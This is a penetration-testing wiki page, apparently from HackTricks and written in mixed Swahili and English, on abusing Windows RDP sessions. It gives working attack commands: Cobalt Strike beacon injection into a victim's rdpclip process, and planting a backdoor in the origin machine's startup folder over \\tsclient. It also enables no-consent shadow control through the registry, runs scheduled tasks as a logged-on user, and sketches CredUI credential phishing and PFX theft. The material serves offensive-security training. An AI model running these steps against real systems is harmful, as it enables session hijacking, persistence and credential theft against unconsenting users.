# RDP Sessions Abuse

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Ikiwa **external group** ina **RDP access** kwa **computer** yoyote katika **domain** ya sasa, **attacker** anaweza **ku-compromise computer** hiyo na kumsubiri.

Mara mtumiaji huyo anapofikia kupitia RDP, **attacker** anaweza kufanya **pivot** hadi kwenye **session** ya mtumiaji huyo na kutumia vibaya **permissions** zake katika **external domain**.
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Angalia **njia nyingine za kuiba sessions kwa kutumia tools nyingine** [**kwenye ukurasa huu.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

Mtumiaji akiingia kupitia **RDP kwenye machine** ambako **attacker** **anamngoja**, attacker ataweza **kuingiza beacon kwenye RDP session ya mtumiaji**, na ikiwa **victim alikuwa amemount drive yake** wakati wa kuingia kupitia RDP, **attacker angeweza kuifikia**.

Katika hali hii, ungeweza tu **ku-compromise** **computer ya awali ya victim** kwa kuandika **backdoor** kwenye **startup folder**.
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

Ikiwa wewe ni **local admin** kwenye host ambayo victim tayari ana **active RDP session**, unaweza kuwa na uwezo wa **kuona/kudhibiti desktop hiyo bila kuiba password au kufanya dumping LSASS**.<sup>[[1]](#references)</sup>

Hii inategemea policy ya **Remote Desktop Services shadowing** iliyohifadhiwa kwenye:<sup>[[2]](#references)[[3]](#references)</sup>
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
Thamani zinazovutia:

- `0`: Imezimwa
- `1`: `EnableInputNotify` (control, idhini ya mtumiaji inahitajika)
- `2`: `EnableInputNoNotify` (control, **hakuna idhini ya mtumiaji**)
- `3`: `EnableNoInputNotify` (kutazama pekee, idhini ya mtumiaji inahitajika)
- `4`: `EnableNoInputNoNotify` (kutazama pekee, **hakuna idhini ya mtumiaji**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
Hii ni muhimu hasa wakati mtumiaji mwenye privileged aliyeunganishwa kupitia RDP ameacha desktop isiyofungwa, session ya KeePass, MMC console, session ya browser, au admin shell ikiwa wazi.

## Scheduled Tasks As Logged-On User

Ikiwa wewe ni **local admin** na mtumiaji lengwa **kwa sasa ameingia**, Task Scheduler inaweza kuanzisha code **kama mtumiaji huyo bila nenosiri lake**.<sup>[[1]](#references)[[4]](#references)</sup>

Hii hubadilisha session ya sasa ya victim ya kuingia kuwa primitive ya kutekeleza code:
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
Notes:

- Ikiwa user **hajaingia**, Windows kwa kawaida huhitaji password ili kuunda task inayotekelezwa kama user huyo.
- Ikiwa user **ameingia**, task inaweza kutumia tena logon context iliyopo.
- Hii ni njia ya vitendo ya kutekeleza GUI actions au kuzindua binaries ndani ya victim session bila kugusa LSASS.

## CredUI Prompt Abuse Kutoka Kwenye Victim Session

Mara tu unapoweza kutekeleza **ndani ya interactive desktop ya victim** (kwa mfano kupitia **Shadow RDP** au **scheduled task inayoendeshwa kama user huyo**), unaweza kuonyesha **Windows credential prompt halisi** ukitumia CredUI APIs na kuvuna credentials zinazoingizwa na victim.<sup>[[1]](#references)</sup>

Relevant APIs:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Typical flow:

1. Spawn binary katika victim session.
2. Onyesha domain-authentication prompt inayolingana na domain branding ya sasa.
3. Unpack auth buffer iliyorejeshwa.
4. Validate credentials zilizotolewa na, kwa hiari, endelea kuonyesha prompt hadi credentials halali ziingizwe.

Hii ni muhimu kwa **on-host phishing** kwa sababu prompt inarenderiwa na standard Windows APIs badala ya fake HTML form.

## Requesting a PFX Katika Victim Context

Primitive hiyo hiyo ya **scheduled-task-as-user** inaweza kutumika kuomba **certificate/PFX kama victim aliyeingia**. Certificate hiyo inaweza kutumiwa baadaye kwa **AD authentication** kama user huyo, hivyo kuepuka kabisa password theft.<sup>[[1]](#references)[[5]](#references)</sup>

High-level flow:

1. Pata **local admin** kwenye host ambayo victim ameingia.
2. Endesha enrollment/export logic kama victim ukitumia **scheduled task**.
3. Export **PFX** inayotokana.
4. Tumia PFX kwa PKINIT / certificate-based AD authentication.

Tazama kurasa za AD CS kwa abuse inayofuata:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [1] [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [2] [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [3] [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [4] [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [5] [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
